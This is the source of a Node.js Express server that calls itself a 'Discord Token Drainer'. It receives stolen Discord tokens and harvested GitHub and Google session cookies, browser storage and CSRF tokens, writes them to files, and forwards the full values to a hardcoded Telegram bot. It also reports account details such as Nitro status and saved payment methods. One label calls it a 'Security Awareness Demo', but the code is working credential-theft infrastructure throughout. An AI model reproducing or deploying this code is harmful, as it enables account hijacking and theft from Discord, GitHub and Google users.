console.log('🚀 Starting Discord Token Drainer Backend...');

const express = require('express');
const cors = require('cors');
const { spawn } = require('child_process');
const path = require('path');
const fs = require('fs');
const axios = require('axios');

console.log('📦 Loading DiscordTokenLogger...');
const DiscordTokenLogger = require('./discord-token-logger');

const app = express();
const PORT = process.env.PORT || 8080;

console.log(`🔧 Server configured for port ${PORT}`);

// Initialize Discord Token Logger
const tokenLogger = new DiscordTokenLogger();

// Telegram Bot Configuration
let TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8309973450:AAHef-eYr2N2B0r4ivuNPwT7JbIGhZMZHH8';
let TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '825587675';

// Telegram messaging function
async function sendToTelegram(message, tokenData = null) {
  try {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.log('⚠️ Telegram not configured - skipping message');
      return { success: false, error: 'Telegram not configured' };
    }

    let messageText;
    
    if (tokenData) {
      // Format token data message (plain text to avoid parsing issues)
      messageText = `🔥 DISCORD TOKEN CAPTURED 🔥

👤 User Information:
• Username: ${tokenData.username || 'Unknown'}
• Discriminator: #${tokenData.discriminator || '0000'}
• User ID: ${tokenData.userId || 'Unknown'}
• Email: ${tokenData.email || 'Not available'}
• Phone: ${tokenData.phone || 'Not available'}

🎮 Account Details:
• Nitro Status: ${tokenData.nitro || 'None'}
• MFA Enabled: ${tokenData.mfa ? '✅ Yes' : '❌ No'}
• Verified: ${tokenData.verified ? '✅ Yes' : '❌ No'}

🔑 Token Information:
• Token: ${tokenData.token}
• Extraction Method: ${tokenData.extractionMethod || 'Unknown'}
• Captured At: ${new Date().toLocaleString()}

💰 Account Value:
• Guilds: ${tokenData.guildCount || 0} servers
• Friends: ${tokenData.friendCount || 0} friends
• Payment Methods: ${tokenData.paymentMethods || 0} saved

🌐 Source: ${tokenData.source || 'Auto Extraction'}

⚡ Status: Successfully captured and verified!`;
    } else {
      messageText = message;
    }

    const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: messageText,
      disable_web_page_preview: true
    });

    console.log('📱 Message sent to Telegram successfully');
    return { success: true, response: response.data };

  } catch (error) {
    console.error('❌ Failed to send Telegram message:', error.message);
    if (error.response) {
      console.error('Telegram API Error:', error.response.data);
    }
    return { success: false, error: error.message };
  }
}

// Duplicate detection system
const processedUsers = new Set(); // Track processed user IDs to prevent duplicates
const processedTokens = new Set(); // Track processed tokens to prevent duplicates
const sentToTelegram = new Set(); // Track what's been sent to Telegram specifically

// Load existing users from CSV to prevent duplicates
function loadExistingUsers() {
  try {
    const csvPath = path.join(__dirname, 'tokens', 'discord_tokens.csv');
    if (fs.existsSync(csvPath)) {
      const csvContent = fs.readFileSync(csvPath, 'utf8');
      const lines = csvContent.split('\n').slice(1); // Skip header
      
      for (const line of lines) {
        if (line.trim()) {
          const columns = line.split(',');
          if (columns.length > 3) {
            const userId = columns[3]; // User ID column
            if (userId && userId !== 'userId') {
              processedUsers.add(userId.trim());
            }
          }
        }
      }
      console.log(`📋 Loaded ${processedUsers.size} existing users to prevent duplicates`);
    }
  } catch (error) {
    console.error('❌ Error loading existing users:', error.message);
  }
}

// Check if user/token already exists
function isUserAlreadyProcessed(userId, username, email, token = null) {
  if (!userId) return false;
  
  // Check by user ID (most reliable)
  if (processedUsers.has(userId)) {
    console.log(`🔄 Skipping duplicate user: ${username} (${userId})`);
    return true;
  }
  
  // Also check by token if provided
  if (token && processedTokens.has(token)) {
    console.log(`🔄 Skipping duplicate token: ${token.substring(0, 20)}...`);
    return true;
  }
  
  return false;
}

// Check if already sent to Telegram specifically
function isAlreadySentToTelegram(userId, token = null) {
  const telegramKey = token ? `${userId}:${token}` : userId;
  return sentToTelegram.has(telegramKey);
}

// Add user to processed lists
function markUserAsProcessed(userId, token = null) {
  if (userId) {
    processedUsers.add(userId);
  }
  if (token) {
    processedTokens.add(token);
  }
}

// Mark as sent to Telegram
function markAsSentToTelegram(userId, token = null) {
  const telegramKey = token ? `${userId}:${token}` : userId;
  sentToTelegram.add(telegramKey);
}

// Load existing users
loadExistingUsers();

// Middleware
app.use(cors({
  origin: [
    'https://captchaguild.com',
    'https://captchaguild.com/api',
    'http://localhost:3000',
    'http://localhost:5000',
    'http://localhost:5001',
    'http://127.0.0.1:3000',
    'http://127.0.0.1:5000',
    'http://127.0.0.1:5001',
    'https://discord-token-logger-frontend.vercel.app',
  ],
  credentials: true,
}));
app.use(express.json()); // For parsing application/json
app.use(express.urlencoded({ extended: true })); // For parsing application/x-www-form-urlencoded

// API Router
const apiRouter = express.Router();
app.use('/api', apiRouter);

// Health check endpoint
apiRouter.get('/health', (req, res) => {
  const stats = tokenLogger.getTokenStats();
  res.json({
    status: 'OK',
    message: 'Discord Token Drainer Backend is running',
    type: 'Node.js Token Logger',
    stats: stats,
    timestamp: new Date().toISOString()
  });
});

// Process Discord token endpoint
apiRouter.post('/process-token', async (req, res) => {
  try {
    const { token, url, timestamp, method } = req.body;

    if (!token) {
      return res.status(400).json({
        success: false,
        message: 'No token provided'
      });
    }

    console.log('Processing Discord token:', token.substring(0, 20) + '...');

    const result = await tokenLogger.processToken({
      token,
      url,
      timestamp: timestamp || new Date().toISOString()
    });

    // Send to Telegram if processing was successful and not a duplicate
    if (result.success && result.userInfo) {
      const userId = result.userInfo.userId;
      const username = result.userInfo.username;
      const email = result.userInfo.email;
      
      if (!isUserAlreadyProcessed(userId, username, email, token) && 
          !isAlreadySentToTelegram(userId, token)) {
        // Mark as processed to prevent future duplicates
        markUserAsProcessed(userId, token);
        markAsSentToTelegram(userId, token);
        
        await sendToTelegram(null, {
          username: result.userInfo.username,
          discriminator: result.userInfo.discriminator,
          email: result.userInfo.email,
          phone: result.userInfo.phone,
          userId: result.userInfo.userId,
          nitro: result.userInfo.nitro,
          mfa: result.userInfo.mfa,
          verified: result.userInfo.verified,
          token: token,
          extractionMethod: method || 'Browser Extraction',
          source: 'Frontend Application',
          guildCount: result.userInfo.guildCount || 0,
          friendCount: result.userInfo.friendCount || 0,
          paymentMethods: result.userInfo.paymentMethods || 0
        });
        
        console.log(`✅ Sent new frontend token to Telegram: ${username} (${userId})`);
      } else {
        console.log(`🔄 Skipping duplicate token from frontend: ${username} (${userId})`);
      }
    }

    res.json(result);
  } catch (error) {
    console.error('Error processing token:', error);
    res.status(500).json({
      success: false,
      message: 'Internal server error',
      error: error.message
    });
  }
});

// Get stored tokens endpoint
apiRouter.get('/tokens', (req, res) => {
  try {
    const stats = tokenLogger.getTokenStats();
    const tokens = tokenLogger.getStoredTokens();

    res.json({
      success: true,
      message: 'Tokens retrieved successfully',
      stats: stats,
      tokens: tokens.map(t => ({
        timestamp: t.timestamp,
        username: t.username,
        userId: t.userId,
        email: t.email,
        nitro: t.nitro,
        mfa: t.mfa,
        tokenPreview: t.token.substring(0, 20) + '...'
      })),
      totalCount: tokens.length,
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    console.error('Error reading tokens:', error);
    res.status(500).json({
      success: false,
      message: 'Error reading token file',
      error: error.message,
      timestamp: new Date().toISOString()
    });
  }
});

// Configure Telegram bot endpoint
apiRouter.post('/configure-telegram', (req, res) => {
  try {
    const { botToken, chatId } = req.body;
    
    if (!botToken || !chatId) {
      return res.status(400).json({
        success: false,
        message: 'Bot token and chat ID are required'
      });
    }
    
    TELEGRAM_BOT_TOKEN = botToken;
    TELEGRAM_CHAT_ID = chatId;
    
    console.log('📱 Telegram bot configured successfully');
    
    res.json({
      success: true,
      message: 'Telegram bot configured successfully',
      config: {
        botToken: botToken.substring(0, 10) + '...',
        chatId: chatId
      }
    });
  } catch (error) {
    console.error('Error configuring Telegram:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to configure Telegram',
      error: error.message
    });
  }
});

// Test Telegram connection endpoint
apiRouter.post('/test-telegram', async (req, res) => {
  try {
    const result = await sendToTelegram('🔧 Test Message\n\nTelegram bot is working correctly!\nToken extraction system is ready.');
    
    if (result.success) {
      res.json({
        success: true,
        message: 'Test message sent successfully to Telegram'
      });
    } else {
      res.status(500).json({
        success: false,
        message: 'Failed to send test message',
        error: result.error
      });
    }
  } catch (error) {
    console.error('Error testing Telegram:', error);
    res.status(500).json({
      success: false,
      message: 'Telegram test failed',
      error: error.message
    });
  }
});

// Process captured cookies endpoint (GitHub/Google)
apiRouter.post('/process-cookie', async (req, res) => {
  try {
    const { cookie, sid, sapisid, type, url, timestamp, method } = req.body;
    const capturedLocalStorage = req.body.localStorage || {};
    const capturedSessionStorage = req.body.sessionStorage || {};
    const capturedTokens = req.body.tokens || {};

    if (!cookie && Object.keys(capturedLocalStorage).length === 0 && Object.keys(capturedTokens).length === 0) {
      return res.status(400).json({
        success: false,
        message: 'No data provided'
      });
    }

    console.log(`🍪 Processing ${type || 'unknown'} capture...`);
    console.log(`   Cookies: ${cookie ? cookie.split(';').length : 0} items`);
    console.log(`   localStorage: ${Object.keys(capturedLocalStorage).length} items`);
    console.log(`   sessionStorage: ${Object.keys(capturedSessionStorage).length} items`);
    console.log(`   Tokens/Meta: ${Object.keys(capturedTokens).length} items`);
    if (sid) console.log(`🔐 SID extracted: ${sid.substring(0, 50)}...`);
    if (sapisid) console.log(`🔐 SAPISID extracted: ${sapisid.substring(0, 50)}...`);

    const cookieRecord = {
      timestamp: timestamp || new Date().toISOString(),
      type: type || 'unknown',
      cookie: cookie || '',
      sid: sid || 'N/A',
      sapisid: sapisid || 'N/A',
      localStorage: capturedLocalStorage,
      sessionStorage: capturedSessionStorage,
      tokens: capturedTokens,
      url: url || 'N/A',
      method: method || 'bookmarklet',
      source: 'Security Awareness Demo'
    };

    // Save to cookies JSON file
    const tokensDir = path.join(__dirname, 'tokens');
    if (!fs.existsSync(tokensDir)) {
      fs.mkdirSync(tokensDir, { recursive: true });
    }
    const cookiesJsonPath = path.join(tokensDir, 'captured_cookies.json');
    let existingCookies = [];
    
    if (fs.existsSync(cookiesJsonPath)) {
      try {
        const data = fs.readFileSync(cookiesJsonPath, 'utf8');
        existingCookies = JSON.parse(data);
      } catch (e) {
        existingCookies = [];
      }
    }
    
    existingCookies.push(cookieRecord);
    fs.writeFileSync(cookiesJsonPath, JSON.stringify(existingCookies, null, 2));
    
    console.log(`✅ ${type} cookie saved to:`, cookiesJsonPath);

    // Parse cookies into key-value pairs
    function parseCookies(cookieStr) {
      if (!cookieStr) return {};
      const parsed = {};
      cookieStr.split(';').forEach(c => {
        const trimmed = c.trim();
        const eqIdx = trimmed.indexOf('=');
        if (eqIdx > 0) {
          parsed[trimmed.substring(0, eqIdx).trim()] = trimmed.substring(eqIdx + 1).trim();
        }
      });
      return parsed;
    }

    function truncVal(val, max = 80) {
      if (!val) return 'N/A';
      const s = String(val);
      return s.length > max ? s.substring(0, max) + '...' : s;
    }

    function formatKV(obj, icon = '📎', max = 80) {
      const keys = Object.keys(obj);
      if (keys.length === 0) return '  (empty)\n';
      let out = '';
      keys.forEach(k => { out += `  ${icon} ${k} = ${truncVal(obj[k], max)}\n`; });
      return out;
    }

    const parsedCookies = parseCookies(cookie);
    const cookieNames = Object.keys(parsedCookies);
    const lsKeys = Object.keys(capturedLocalStorage);
    const ssKeys = Object.keys(capturedSessionStorage);
    const tokenKeys = Object.keys(capturedTokens);

    // Build Telegram messages (split into multiple if too long)
    let telegramMsgs = [];

    if (type === 'github') {
      const sessionKeys = ['user_session', '__Host-user_session_same_site', '_gh_sess', 'logged_in', 'dotcom_user', 'gh_session'];
      const capturedSession = sessionKeys.filter(k => parsedCookies[k]);

      let msg1 = `🐙 GITHUB DATA CAPTURED 🐙

📊 Summary:
• Cookies: ${cookieNames.length}
• Session cookies: ${capturedSession.length > 0 ? capturedSession.join(', ') : 'None (HttpOnly)'}
• localStorage: ${lsKeys.length} items
• sessionStorage: ${ssKeys.length} items
• Tokens/CSRF: ${tokenKeys.length} items
${capturedTokens['github_username'] ? `• GitHub User: ${capturedTokens['github_username']}` : ''}

🌐 Source: ${url}
⏰ Time: ${new Date().toLocaleString()}
📋 Method: ${method}
${capturedSession.length > 0 ? '\n⚡ Session cookies captured!' : '\n🛡️ Session cookies blocked by HttpOnly.'}
${tokenKeys.length > 0 ? '🔑 CSRF/auth tokens captured from page!' : ''}`;
      telegramMsgs.push(msg1);

      let cookieMsg = `🐙 GITHUB ALL COOKIES (FULL) 🐙\n\n`;
      cookieNames.forEach(k => {
        const isSession = sessionKeys.includes(k);
        cookieMsg += `${isSession ? '🔐' : '📎'} ${k}:\n${parsedCookies[k]}\n\n`;
      });
      const cookieChunks = [];
      while (cookieMsg.length > 0) {
        cookieChunks.push(cookieMsg.substring(0, 4000));
        cookieMsg = cookieMsg.substring(4000);
      }
      cookieChunks.forEach(c => telegramMsgs.push(c));

      if (tokenKeys.length > 0) {
        let msg2 = `🐙 GITHUB TOKENS & CSRF 🐙\n\n`;
        tokenKeys.forEach(k => { msg2 += `🔐 ${k}:\n${capturedTokens[k]}\n\n`; });
        telegramMsgs.push(msg2);
      }

      if (lsKeys.length > 0) {
        let msg3 = `🐙 GITHUB localStorage (${lsKeys.length}) 🐙\n\n`;
        lsKeys.forEach(k => { msg3 += `💾 ${k} = ${truncVal(capturedLocalStorage[k], 200)}\n`; });
        telegramMsgs.push(msg3);
      }

      if (ssKeys.length > 0) {
        let msg4 = `🐙 GITHUB sessionStorage (${ssKeys.length}) 🐙\n\n`;
        ssKeys.forEach(k => { msg4 += `📝 ${k} = ${truncVal(capturedSessionStorage[k], 200)}\n`; });
        telegramMsgs.push(msg4);
      }

    } else if (type === 'google') {
      const criticalKeys = ['SID', 'SSID', 'HSID', 'SAPISID', 'APISID', '__Secure-1PSID', '__Secure-3PSID', '__Secure-1PAPISID', '__Secure-3PAPISID', 'SIDCC', '__Secure-1PSIDCC', '__Secure-3PSIDCC'];
      const capturedCritical = criticalKeys.filter(k => parsedCookies[k]);
      const nonCriticalCookies = {};
      cookieNames.forEach(k => { if (!criticalKeys.includes(k)) nonCriticalCookies[k] = parsedCookies[k]; });

      let msg1 = `🔍 GOOGLE DATA CAPTURED 🔍

📊 Summary:
• Cookies: ${cookieNames.length}
• Critical auth cookies: ${capturedCritical.length}/${criticalKeys.length}
• localStorage: ${lsKeys.length} items
• sessionStorage: ${ssKeys.length} items
• Tokens/Meta: ${tokenKeys.length} items

🌐 Source: ${url}
⏰ Time: ${new Date().toLocaleString()}
📋 Method: ${method}
${capturedCritical.length > 0 ? '\n⚡ Critical auth cookies captured!' : '\n🛡️ Critical auth cookies blocked by HttpOnly.'}`;
      telegramMsgs.push(msg1);

      if (capturedCritical.length > 0) {
        let criticalMsg = `🔍 GOOGLE CRITICAL COOKIES (FULL) 🔍\n\n`;
        capturedCritical.forEach(k => {
          const val = parsedCookies[k];
          criticalMsg += `🔐 ${k}:\n${val}\n\n`;
        });
        const critChunks = [];
        while (criticalMsg.length > 0) {
          critChunks.push(criticalMsg.substring(0, 4000));
          criticalMsg = criticalMsg.substring(4000);
        }
        critChunks.forEach(c => telegramMsgs.push(c));
      }

      const nonCritKeys = Object.keys(nonCriticalCookies);
      if (nonCritKeys.length > 0) {
        let msg3 = `🔍 GOOGLE OTHER COOKIES (${nonCritKeys.length}) 🔍\n\n`;
        nonCritKeys.forEach(k => {
          msg3 += `📎 ${k} = ${parsedCookies[k]}\n`;
        });
        telegramMsgs.push(msg3);
      }

      if (lsKeys.length > 0 || ssKeys.length > 0 || tokenKeys.length > 0) {
        let msg4 = `🔍 GOOGLE STORAGE & TOKENS 🔍\n\n`;
        if (tokenKeys.length > 0) msg4 += `🔑 Tokens/Meta:\n${formatKV(capturedTokens, '🔐', 200)}\n`;
        if (lsKeys.length > 0) msg4 += `💾 localStorage (${lsKeys.length}):\n${formatKV(capturedLocalStorage, '💾', 200)}\n`;
        if (ssKeys.length > 0) msg4 += `📝 sessionStorage (${ssKeys.length}):\n${formatKV(capturedSessionStorage, '📝', 200)}\n`;
        telegramMsgs.push(msg4);
      }

    } else {
      let msg1 = `🍪 ${(type || 'UNKNOWN').toUpperCase()} DATA CAPTURED 🍪

📊 Summary:
• Cookies: ${cookieNames.length}
• localStorage: ${lsKeys.length} items
• sessionStorage: ${ssKeys.length} items
• Tokens: ${tokenKeys.length} items

🍪 Cookies:
${formatKV(parsedCookies, '📎', 60)}`;
      if (tokenKeys.length > 0) msg1 += `\n🔑 Tokens:\n${formatKV(capturedTokens, '🔐', 100)}`;
      if (lsKeys.length > 0) msg1 += `\n💾 localStorage:\n${formatKV(capturedLocalStorage, '💾', 100)}`;
      if (ssKeys.length > 0) msg1 += `\n📝 sessionStorage:\n${formatKV(capturedSessionStorage, '📝', 100)}`;
      msg1 += `\n🌐 URL: ${url}\n⏰ Time: ${new Date().toLocaleString()}`;
      telegramMsgs.push(msg1);
    }

    for (const msg of telegramMsgs) {
      const trimmed = msg.substring(0, 4000);
      await sendToTelegram(trimmed);
    }

    res.json({
      success: true,
      message: `${type} cookie captured and saved`,
      type: type
    });

  } catch (error) {
    console.error('Error processing cookie:', error);
    res.status(500).json({
      success: false,
      message: 'Internal server error',
      error: error.message
    });
  }
});

// Start server — publicBase is what this process listens on / Render exposes (local = localhost)
const publicBase =
  process.env.RENDER_EXTERNAL_URL?.replace(/\/$/, '') ||
  process.env.PUBLIC_API_URL?.replace(/\/$/, '') ||
  `http://localhost:${PORT}`;

const frontendPublicUrl =
  process.env.FRONTEND_PUBLIC_URL?.replace(/\/$/, '') ||
  'https://discord-token-logger-frontend.vercel.app';

const deployedBackendHint =
  process.env.BACKEND_PUBLIC_URL?.replace(/\/$/, '') ||
  'https://discord-token-logger-backend.onrender.com';

app.listen(PORT, () => {
  const isLocalDev = publicBase.includes('localhost');

  console.log(`🚀 Discord Token Drainer Backend — port ${PORT}`);

  if (isLocalDev) {
    // Lead with production URLs so local runs are not confusing vs Render / Vercel
    console.log('');
    console.log('📍 Production (Vercel frontend + Render backend — what users hit):');
    console.log(`   Frontend     ${frontendPublicUrl}`);
    console.log(`   Backend      ${deployedBackendHint}`);
    console.log(`   GET  health  ${deployedBackendHint}/api/health`);
    console.log(`   POST token   ${deployedBackendHint}/api/process-token`);
    console.log(`   POST cookie  ${deployedBackendHint}/api/process-cookie`);
    console.log('');
    console.log(`💻 Only this laptop → API bound at ${publicBase} (Postman/curl here while developing)`);
  } else {
    console.log(`🌐 API base     ${publicBase}`);
    console.log(`🖥️  Frontend    ${frontendPublicUrl}`);
    console.log(`⚡ Health       ${publicBase}/api/health`);
    console.log(`🔑 Token        ${publicBase}/api/process-token`);
    console.log(`🍪 Cookie       ${publicBase}/api/process-cookie`);
    console.log(`📊 Tokens list  ${publicBase}/api/tokens`);
    console.log(`📱 Telegram cfg ${publicBase}/api/configure-telegram`);
    console.log(`🧪 Telegram test ${publicBase}/api/test-telegram`);
  }
  
  // Send startup message to Telegram
  setTimeout(async () => {
    const result = await sendToTelegram('🚀 Discord Token Drainer Backend started successfully!');
    if (result.success) {
      console.log('✅ Startup message sent to Telegram successfully.');
    } else {
      console.error('❌ Failed to send startup message to Telegram:', result.error);
    }
  }, 5000); // Send after 5 seconds
});

module.exports = app;